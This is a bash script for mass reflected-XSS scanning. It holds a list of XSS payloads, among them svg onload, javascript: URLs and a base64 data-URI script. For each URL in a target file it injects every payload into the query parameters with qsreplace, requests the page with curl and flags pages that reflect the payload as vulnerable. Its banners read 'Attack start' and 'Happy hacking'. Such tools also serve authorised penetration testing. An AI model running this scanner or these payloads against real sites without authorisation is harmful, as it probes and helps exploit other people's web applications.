#!/bin/bash



echo -e "\n"

declare -a arr=(
"'\"><svg/onload=prompt(5)>"
"<IMG SRC=javascript:alert('XSS')>"
"<xss id=x tabindex=1 onactivate=alert(1)></xss>"
"<audio src/onerror=alert(1)>"
"<body onmessage=print()>"
"<script>onerror=alert;throw 1</script>"
"<iframe src=\"javascript:alert(1)\">"
"<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>"
)

## now loop through the above array
echo -e "\e[94mAttack start"
echo -e "\e[94 _message 'done' will be shown if finished"
echo -e "\e[94mHappy hacking :)"
for i in "${arr[@]}"
do
cat xss.txt | grep '=' | qsreplace "$i" |  while read host do ; 
	do curl -s --path-as-is --insecure "$host" | grep -qs "$i" && echo -e "\033[0;36m$host \033[0;31m" Vulnerable;done;
	
done
echo -e "\n"
echo -e "\e[94mdone"
